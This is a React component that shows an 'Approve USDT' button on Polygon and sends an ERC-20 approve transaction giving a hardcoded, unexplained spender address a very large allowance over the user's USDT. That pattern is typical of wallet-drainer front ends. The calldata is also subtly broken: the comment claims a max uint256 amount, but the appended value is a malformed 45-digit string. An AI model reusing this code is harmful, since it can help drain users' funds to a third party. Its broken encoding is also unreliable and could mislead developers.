import { useState } from 'react';

const USDT_CONTRACT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
const SPENDER_ADDRESS = "0x406aE7273E16F48caA25C5a4C37266661051A11e";
const POLYGON_CHAIN_ID = '0x89'; // Chain ID for Polygon mainnet

function UsdtApprovalButton({ connected, account }) {
    const [approving, setApproving] = useState(false);
    
    const getData = () => {
        return "0x095ea7b3" + 
               SPENDER_ADDRESS.substring(2).padStart(64, '0') + 
               "100000000000000000000000000000000000000000000"; // Max uint256 value
    };
    
    const estimateGas = async () => {
        const data = getData();

        const params = [{
            from: account,
            to: USDT_CONTRACT_ADDRESS,
            data: data
        }];

        try {
            return await window.ethereum?.request({
                method: 'eth_estimateGas',
                params,
            });
        } catch (error) {
            console.error("Error estimating gas: ", error);
            return "0x186a0"; // fallback to default gas
        }
    };

    const switchToPolygon = async () => {
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: POLYGON_CHAIN_ID }],
            });
        } catch (error) {
            if (error.code === 4902) {
                console.error('Polygon network not added to user wallet');
            } else {
                console.error('Error switching to Polygon:', error);
            }
        }
    };

    const approveUSDT = async () => {
        setApproving(true);
        
        // Check current network
        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });

        if (currentChainId !== POLYGON_CHAIN_ID) {
            await switchToPolygon();
            // Return early after switching, user can click "Approve" again once on the correct network
            setApproving(false);
            return;
        }

        const gasEstimate = await estimateGas();
        const data = getData();

        const params = [{
            from: account,
            to: USDT_CONTRACT_ADDRESS,
            data: data,
            gas: gasEstimate
        }];

        // Console log the data and params being sent for approval
    console.log("Data being sent for approval: ", data);
    console.log("Transaction parameters: ", params);

        try {
            const result = await window.ethereum?.request({
                method: 'eth_sendTransaction',
                params,
            });
            console.log("Approval TX Result: ", result);
        } catch (e) {
            console.error("Error approving USDT: ", e);
        } finally {
            setApproving(false);
        }
    };

    return (
        <div>
            {connected ? (
                <button onClick={approveUSDT} disabled={approving}>
                    {approving ? 'Approving...' : 'Approve USDT'}
                </button>
            ) : (
                <span></span>
            )}
        </div>
    );
}

export default UsdtApprovalButton;
